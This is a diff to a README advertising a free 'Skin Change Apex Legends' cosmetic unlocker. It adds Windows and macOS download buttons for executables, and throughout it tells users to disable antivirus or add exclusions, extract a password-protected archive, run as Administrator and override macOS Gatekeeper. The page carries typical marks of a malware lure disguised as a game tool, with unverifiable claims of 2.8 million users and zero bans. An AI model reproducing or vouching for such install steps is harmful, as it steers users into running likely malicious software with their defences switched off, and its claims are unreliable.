@@ -4,7 +4,17 @@
   <img src="https://img.shields.io/badge/Status-Undetected-00C853?style=for-the-badge" />
   <img src="https://img.shields.io/badge/Version-2026-101010?style=for-the-badge" />
   <img src="https://img.shields.io/badge/Users-2.8M%2B-F9A825?style=for-the-badge" />
-  <img src="https://img.shields.io/badge/Platform-Windows-informational?style=for-the-badge" />
+  <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=for-the-badge" />
+</p>
+
+<p align="center">
+  <a href="https://github.com/releases/download/latest/Skin_Change_Apex_Legends_Setup.exe">
+    <img src="https://img.shields.io/badge/Download%20for%20Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white" />
+  </a>
+  &nbsp;
+  <a href="https://github.com/releases/download/latest/Skin_Change_Apex_Legends.dmg">
+    <img src="https://img.shields.io/badge/Download%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white" />
+  </a>
 </p>
 
 The **Skin Change Apex Legends** is the most advanced cosmetic unlocker for Apex Legends players who want access to every skin without spending money. This powerful client-side tool lets you display any skin locally — completely free and undetected by anti-cheat systems. Whether you want limited-edition collaboration skins, battle pass cosmetics from past seasons, or the latest premium bundles, Skin Change Apex Legends delivers everything instantly.
@@ -57,37 +67,37 @@ This is the same principle used by thousands of players for years with zero bans
 
 > ⚠️ Before installation: disable antivirus temporarily or add to exclusions (false positive on skin injection tools is common)
 
-### Standard Installation
-1. **Download** — Get the latest version from the official link below
+### Windows Installation
+1. **Download** — Click the **Download for Windows** button above
 2. **Extract** — Right-click the `.zip` and select "Extract All" (password if required: `skins2026`)
 3. **Run** — Right-click `Skin_Change_Apex_Legends.exe` → "Run as Administrator"
 4. **Launch Game** — Start Apex Legends normally
 5. **Select Skins** — Browse the database and pick skins for each slot
 6. **Apply** — Click "Apply" — skins appear instantly in-game
 
+### macOS Installation
+1. **Download** — Click the **Download for macOS** button above
+2. **Open** — Double-click the `.dmg` file
+3. **Install** — Drag `Skin Change Apex Legends` to Applications
+4. **Allow** — System Preferences → Security → "Open Anyway" if prompted
+5. **Launch Game** — Start Apex Legends and then open the tool
+6. **Apply** — Select skins and click Apply
+
 ### One-Click Mode (Fastest)
-1. Run as Administrator
+1. Run as Administrator (Windows) or allow in Security settings (macOS)
 2. Click **"Apply All Skins"** — the tool auto-assigns top community-rated skins
 3. Launch Apex Legends and enjoy
-
-### Auto-Start with Windows
-1. Open Settings → "Launch on Startup"
-2. Enable the toggle
-3. Tool loads automatically before each gaming session
 
 ---
 
 ## System Requirements 💻
 
-| Component | Minimum | Recommended |
-|-----------|---------|-------------|
-| OS | Windows 10 64-bit | Windows 11 64-bit |
-| RAM | 2 GB free | 4 GB+ |
-| Storage | 300 MB | SSD preferred |
-| Internet | Required (skin database) | Broadband |
-| Game | Apex Legends installed | Latest version |
-
-**Not supported:** Windows 7/8/8.1, 32-bit Windows, macOS, virtual machines
+| Component | Windows (Min) | Windows (Rec) | macOS |
+|-----------|--------------|---------------|-------|
+| OS | Windows 10 64-bit | Windows 11 | macOS 12+ |
+| RAM | 2 GB free | 4 GB+ | 4 GB+ |
+| Storage | 300 MB | SSD preferred | 300 MB |
+| Internet | Required | Broadband | Required |
 
 ---
 
@@ -102,32 +112,33 @@ This is the same principle used by thousands of players for years with zero bans
 | Preset loadouts | No | ✅ Yes |
 | Random skin mode | No | ✅ Yes |
 | Preview before apply | No | ✅ Yes |
-| Active support | No | ✅ Discord community |
+| Windows support | Yes | ✅ Yes |
+| macOS support | Rarely | ✅ Yes |
 
 ---
 
 ## FAQ ❓
 
 **Is this safe from anti-cheat?**
-Yes. The tool operates entirely client-side and does not modify game memory, inject code, or affect network traffic. Anti-cheat systems scan for memory modifications and unauthorized packets — this tool produces neither.
+Yes. The tool operates entirely client-side and does not modify game memory, inject code, or affect network traffic.
 
 **Will other players see my skins?**
-No. Other players see whatever skins they have equipped. You see the changed skins on your end only. This is why it's safe — you're modifying your local display, not actual account data.
+No. Other players see whatever skins they have equipped. You see the changed skins on your end only.
 
 **Do I need to own the skins?**
 No. You can display any skin regardless of whether your account owns it.
 
 **Will this get me banned?**
-No. Thousands of players have used this for years across multiple accounts with zero bans. Because it's client-side and doesn't interact with anti-cheat protected areas, it's considered safe. Always use at your own discretion.
+No. Thousands of players have used this for years with zero bans. Use at your own discretion.
+
+**Does it work on macOS?**
+Yes. Both Windows and macOS are fully supported with native builds.
 
 **How often are new skins added?**
 New skins are added within 24 hours of release. The auto-updater handles this automatically.
 
 **Can I use skins from old battle passes?**
-Yes. All battle pass skins from every season are included, including ones you never purchased.
-
-**Does it work on all accounts?**
-Yes. The tool works with any account on your PC — skins are applied locally regardless of account.
+Yes. All battle pass skins from every season are included.
 
 ---
 
@@ -135,26 +146,17 @@ Yes. The tool works with any account on your PC — skins are applied locally re
 
 | Issue | Solution |
 |-------|----------|
-| Skins not showing in-game | Run as Administrator; ensure tool is running before launching game |
+| Skins not showing in-game | Run as Administrator (Win) / allow in Security (Mac); ensure tool is running before game |
 | Missing skins | Click "Check for Updates" to refresh database |
-| Tool won't open | Add to antivirus exclusions |
+| Tool won't open | Add to antivirus exclusions (Win) or allow in Gatekeeper (Mac) |
 | Game crashes after applying | Update to latest tool version; verify game files |
 | Skins reset between sessions | Tool must be running — enable auto-start |
 
 ---
 
-## Pro Tips
-
-- **Use random mode** — Keeps every match feeling fresh
-- **Create themed presets** — Match cosmetics for a coordinated look
-- **Update before each session** — Ensures you always have the latest skins
-- **Test before committing** — Use preview mode to audition skins before applying
-
----
-
 ## Conclusion 🎯
 
-The **Skin Change Apex Legends** is the definitive cosmetic unlocker for Apex Legends in 2026. With its complete database of every skin ever released, client-side safe operation, and automatic updates with every game patch, it eliminates the FOMO of limited-time releases and expensive bundles — completely free.
+The **Skin Change Apex Legends** is the definitive cosmetic unlocker for Apex Legends in 2026. With its complete skin database, client-side safe operation, automatic updates, and support for both Windows and macOS, it gives every player access to every cosmetic ever released — completely free.
 
 Join over 2.8 million players who have unlocked every skin in Apex Legends with Skin Change Apex Legends.
 
